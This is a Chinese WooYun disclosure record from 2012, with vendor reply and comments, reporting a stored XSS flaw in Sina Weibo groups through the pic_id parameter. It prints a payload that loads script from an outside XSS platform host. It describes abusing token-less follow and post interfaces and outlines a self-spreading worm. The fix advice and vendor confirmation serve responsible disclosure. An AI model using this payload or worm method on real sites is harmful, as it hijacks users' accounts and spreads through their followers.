{"id": 17726, "wybug_id": "wooyun-2012-010143", "wybug_title": "新浪微博某处存储型小松鼠+顺便提一提相关接口未加上TOKEN", "wybug_corp": "新浪", "wybug_author": "imlonghao", "wybug_date": "2012-07-25 17:48", "wybug_open_date": "2012-09-08 17:49", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-07-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-07-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-08-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-08-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-08-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-09-08：\t细节向公众公开  简要描述： 小松鼠很可爱，它可以让你的粉丝剧增！ 详细说明：  今天，给大家带来是新浪微群的XSS+发微博+关注什么东西都准备好了，代码什么的都准备好了，主要就是用了演示一下过程 \"/><script src=http://xsser.me/UZH56T></script><img high=0 weight=0 打开神器FID  随便找一个微群测试随便上传一张图片发送的同时截包经过测试，其中的pic_id几乎什么参数都没有过滤，所以说XSS就从这里开始。我们插入上面的代码刷新前面的是闭合前面的图片，后面的<img high=0 weight=0 是为了屏蔽那些暴漏的代码我们可以看到，这里完全没有过滤，所以我的代码就轻松的插了进去。。。- -||新浪微博由于有http-only，所以盗了COOKIES也是进不去那个帐号的，改COOKIES浏览会跳回登录页。所以，今天就来发微博和+关注。发微博本身是想用weibo.com这里面的接口后来G大说不同域所以就找q.weibo.com的接口经过一轮筛选，我找到了这个接口。- -||如果用下面的发微博同步的话，就会有未加入微群的限制，而这个，推荐就没什么限制。感谢G大给的代码。。。。。我为什么要说加关注和发微博呢，就是想提醒。TOKEN很重要，加个token又不会怀孕 - -||我们现在来测试一下。。。下面坐等新关注。。。好了，已经有了。我们看到，关注了我，并且发了微博。。。果断删掉。。。- -蠕虫的话，只需要发微博，微博的地址带上这个连接就可以了。。我觉得用编码一下会更好，。。。假设这个地址还有XSS。。JS转义。。还可以加点别的东西就这样，我想一个蠕虫就做好了。。。。\t\t\t\t\t\t伟大的厂商，看在我录视频的份上，20RK吧。。\t\t\t\t\t\t伟大的XSSER，看在我录视频的份上，劈死我把。。。。END。。。   漏洞证明：  http://115.com/file/c26xc0w5提取密码：wooyun   修复方案：  检查pic_id，如果有字母和数字以外的东西，通通报错。相关接口加上TOKEN。。。。。   版权声明：转载请注明来源 imlonghao@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2012-07-26 11:25 厂商回复： 感谢提供，已经修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-07-25 17:57 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  。    \n     2012-07-25 18:19 |    \t\t黄小昏 \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:7        | alert（妹子）)\t\t \n  小松鼠...    \n     2012-07-25 19:00 |    \t\timlonghao \t\t\t( 普通白帽子  |\t\t\t        Rank:730 漏洞数:74        )\t\t \n  @黄小昏 小松鼠=XSS    \n     2012-07-25 19:06 |    \t\timlonghao \t\t\t( 普通白帽子  |\t\t\t        Rank:730 漏洞数:74        )\t\t \n  怎么办，我感觉自评高了。。。- -||    \n     2012-07-25 20:51 |    \t\t水滴 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:24        )\t\t \n  @sina 给他1分    \n     2012-07-25 21:02 |    \t\timlonghao \t\t\t( 普通白帽子  |\t\t\t        Rank:730 漏洞数:74        )\t\t \n  @水滴 他会的    \n     2012-07-26 13:52 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  @imlonghao 恭喜洞主获得15分    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}